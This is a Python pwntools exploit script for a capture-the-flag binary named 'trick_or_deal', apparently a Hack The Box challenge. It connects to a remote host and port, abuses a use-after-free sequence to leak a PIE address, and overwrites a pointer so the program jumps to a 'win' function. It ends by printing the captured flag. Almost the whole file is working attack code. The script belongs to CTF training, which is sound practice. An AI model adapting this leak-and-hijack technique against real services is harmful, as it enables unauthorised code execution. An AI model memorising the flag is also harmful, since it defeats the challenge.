#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template trick_or_deal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('trick_or_deal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *make_offer+157
b *make_offer+220
b *steal+90
b *menu+424
b *menu+408
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'

#io = start()
io = remote('64.227.45.51', 31545)

def buy(data):
    io.sendafter(b'do? ', b'2')
    io.sendafter(b'? ', data)

def offer(size, data):
    io.sendafter(b'do? ', b'3')
    io.sendafter(b': ', b'y')
    io.sendafter(b'be? ', str(size))
    io.sendafter(b'me? ', data)

def steal():
    io.sendafter(b'do? ', b'4')

offer(0x100,b'A'*0x100)
steal()
buy(b'A'*8)
io.recvuntil(b'AAAAAAAA')
pie_leak = int.from_bytes(io.recvline().rstrip(), 'little')
print(f"PIE leak: {hex(pie_leak)}")
pie_base = pie_leak - 0x15e2
print(f"PIE base: {hex(pie_base)}")
win = pie_base + 0xeff
print(f"win addr: {hex(win)}")

offer(0x50,b'A'*0x48 + p64(win))
io.sendafter(b'do? ', b'1')
io.interactive()
# HTB{tr1ck1ng_d3al3rz_f0r_fUn_4nd_pr0f1t}
